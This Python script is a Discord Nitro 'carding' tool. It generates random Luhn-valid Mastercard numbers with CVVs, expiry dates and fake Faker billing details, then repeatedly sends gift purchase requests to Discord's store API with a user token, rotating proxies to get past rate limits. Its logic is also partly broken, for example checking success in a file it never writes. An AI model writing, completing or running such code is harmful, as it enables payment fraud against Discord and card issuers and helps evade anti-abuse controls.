import random
import datetime
import asyncio
import aiohttp
import logging
from faker import Faker

logging.basicConfig(
    level=logging.INFO,
    format="\x1b[38;5;9m[\x1b[0m%(asctime)s\x1b[38;5;9m]\x1b[0m %(message)s\x1b[0m",
    datefmt="%H:%M:%S"
)

fake = Faker()

def generate_checksum(card_number):
    """Generate the checksum using the Luhn algorithm."""
    digits = [int(x) for x in card_number[::-1]]
    doubled_digits = [(x * 2) if (i % 2 != 0) else x for i, x in enumerate(digits)]
    subtracted_nine = [(x - 9) if (x > 9) else x for x in doubled_digits]
    total = sum(subtracted_nine)
    checksum = (10 - (total % 10)) % 10
    return str(checksum)

def is_valid_credit_card(card_number):
    """Check if the credit card number is valid."""
    checksum = generate_checksum(card_number[:-1])
    return checksum == card_number[-1]

def generate_credit_card():
    """Generate a random Mastercard credit card number with CVV and expiry date."""
    bin_number = '5' + ''.join(str(random.randint(0, 9)) for _ in range(5))
    account_number = ''.join(str(random.randint(0, 9)) for _ in range(9))
    card_number = bin_number + account_number
    checksum = generate_checksum(card_number)
    card_number += checksum
    cvv = ''.join(str(random.randint(0, 9)) for _ in range(3))
    current_year = datetime.datetime.now().year
    expiry_month = random.randint(1, 12)
    expiry_year = random.randint(current_year + 1, current_year + 5)
    expiry_date = f"{expiry_month}/{expiry_year}"
    return card_number, cvv, expiry_date

def generate_nitro_data():
    """Generate fake but plausible Nitro data."""
    pin_code = fake.zipcode()
    state = fake.state()
    return pin_code, state

async def fetch_sku_details(session, token):
    url = "https://discord.com/api/v9/store/skus"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            return await response.json()
        else:
            logging.error(f"Failed to fetch SKU details: {response.status}")
            return None

async def fetch_subscription_plans(session, token, sku_id):
    url = f"https://discord.com/api/v9/store/skus/{sku_id}/subscription-plans"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            return await response.json()
        else:
            logging.error(f"Failed to fetch subscription plans for SKU {sku_id}: {response.status}")
            return None

async def find_nitro_plan(session, token):
    skus = await fetch_sku_details(session, token)
    if not skus:
        return None, None, None, None

    for sku in skus:
        if sku['name'].lower() == "nitro":
            subscription_plans = await fetch_subscription_plans(session, token, sku['id'])
            if not subscription_plans:
                continue
            for plan in subscription_plans:
                if plan['price']['currency'] == 'USD' and plan['price']['amount'] == 999:  # Adjust the price amount as needed
                    return plan['id'], plan['price']['amount'], plan['price']['currency'], plan['purchase_token']
    
    logging.error("No matching Nitro plan found.")
    return None, None, None, None

async def purchase_nitro(session, card_info, pin_code, state, plan_id, amount, currency, purchase_token, token, proxy=None):
    proxy_url = proxy if proxy else None
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    async with session.post(
        f"https://discord.com/api/v9/store/skus/{plan_id}/purchase",
        json={
            "gift": True,
            "sku_subscription_plan_id": plan_id,
            "payment_source_id": card_info[0],
            "expected_amount": amount,
            "expected_currency": currency,
            "purchase_token": purchase_token,
            "billing_address": fake.address(),
            "billing_city": fake.city(),
            "billing_zip": pin_code,
            "billing_state": state,
            "billing_country": "US",
            "billing_name": fake.name(),
            "cvv": card_info[1],
            "expires": card_info[2],
            "pin": pin_code
        },
        headers=headers,
        proxy=proxy_url
    ) as response:
        if response.status == 200:
            logging.info("Successfully claimed Nitro with card ending in: %s" % (card_info[0][-4:]))
        elif response.status == 401:
            logging.error("Authorization error with card ending in: %s" % (card_info[0][-4:]))
        elif response.status == 429:
            logging.error("Rate limit error with card ending in: %s" % (card_info[0][-4:]))
        else:
            logging.error(f"Failed to claim Nitro with card ending in: %s, Status Code: {response.status}")

async def main():
    use_proxy = input("Do you want to use a proxy? (yes/no): ").lower() == "yes"
    token = input("Enter your Discord user token: ")
    
    async with aiohttp.ClientSession() as session:
        plan_id, amount, currency, purchase_token = await find_nitro_plan(session, token)
        if not plan_id:
            logging.error("Failed to fetch Nitro details. Exiting.")
            return
        
        proxy_list = []
        if use_proxy:
            with open("proxies.txt", "r") as file:
                proxy_list = file.readlines()
                proxy_list = [proxy.strip() for proxy in proxy_list]
        
        success = False
        while not success:
            if use_proxy:
                proxy = random.choice(proxy_list) if proxy_list else None
            else:
                proxy = None
            
            valid_credit_cards = []
            for _ in range(100):
                card_number, cvv, expiry_date = generate_credit_card()
                if is_valid_credit_card(card_number):
                    valid_credit_cards.append((card_number, cvv, expiry_date))

            for card_info in valid_credit_cards:
                pin_code, state = generate_nitro_data()
                await purchase_nitro(session, card_info, pin_code, state, plan_id, amount, currency, purchase_token, token, proxy)
                await asyncio.sleep(3)  # 3 seconds delay between each purchase attempt

            with open('cc.txt', 'r') as f:
                for line in f:
                    if "Successfully claimed Nitro" in line:
                        success = True
                        break

            if not success:
                logging.info("All credit cards failed to claim Nitro. Retrying with new credit cards.")

asyncio.run(main())
